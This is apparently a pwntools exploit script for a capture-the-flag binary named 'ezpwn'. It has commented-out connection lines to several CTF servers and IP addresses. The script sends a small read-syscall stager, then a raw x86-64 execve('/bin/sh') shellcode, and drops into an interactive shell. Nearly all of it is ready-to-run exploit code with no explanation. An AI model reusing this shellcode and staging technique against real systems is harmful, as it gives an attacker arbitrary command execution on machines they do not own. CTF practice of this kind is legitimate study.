# import time
from pwn import *
# from LibcSearcher import *
# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# io = remote("192.168.170.128", 1234)
# io = remote("dasctf_sixbytes.node.game.sycsec.com", 30774)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("node5.anna.nssctf.cn", 28604)
# io = remote("112.6.51.212", 30362)
# io = remote("8.130.35.16", 51003)
io = process('./ezpwn')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('ezpwn')
# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r(n):
    return (io.recv(n))
def ru(a):
    return io.recvuntil(a)
def rl():
    return io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)
def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

# shellcode1 = asm('''
# xor rax,rax
# mov dx,0x100
# syscall
# ''')

shellcode1 = b"\x48\x31\xc0\x66\xba\x00\x01\x0f\x05"

shellcode2 = b'\x31\xD2\x52\x54\x5E\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x54\x5F\xB0\x3B\x99\x0F\x05'

payload = b'/bin/sh\x00' + shellcode1
print(len(payload))
io.send(payload)
payload1 = b'a' * 9 + shellcode2
io.send(payload1)

inter()

